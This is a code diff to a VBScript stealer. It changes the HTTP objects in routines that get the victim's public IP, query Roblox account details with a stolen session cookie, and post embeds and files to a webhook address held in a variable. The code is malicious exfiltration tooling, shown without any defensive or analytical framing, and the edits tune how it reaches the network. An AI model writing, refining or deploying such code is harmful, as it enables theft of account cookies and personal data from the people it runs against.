@@ -21,8 +21,7 @@ End Sub
 
 Sub IP()
     Dim xh, ip, ll, info
-    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
+    Set xh = CreateObject("MSXML2.XMLHTTP.6.0")
     xh.Open "GET", "https://api.ipify.org/", False : xh.Send
     If xh.Status <> 200 Then Exit Sub
     ip = Trim(xh.responseText)
@@ -312,8 +311,7 @@ End Sub
 Sub GrabRobloxInfo(cookie)
     Dim xh, json, uinfo, uid, uname, robux, premium, created, ageDays, rapVal, createdDate
 
-    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
+    Set xh = CreateObject("MSXML2.XMLHTTP.6.0")
 
     ' --- userinfo (uid, username, robux, premium) ---
     xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
@@ -420,8 +418,7 @@ Sub PostEmbed(t, d, c)
     Dim DQ, j, h
     DQ = Chr(34)
     j  = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
-    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
+    Set h = CreateObject("MSXML2.XMLHTTP.6.0")
     h.Open "POST", WH, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
@@ -435,8 +432,7 @@ Sub PostFile(fn, ct)
     bd = "--" & b & vbCrLf & _
          "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & _
          ct & vbCrLf & "--" & b & "--"
-    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
+    Set h = CreateObject("MSXML2.XMLHTTP.6.0")
     h.Open "POST", WH, False
     h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
     h.Send bd
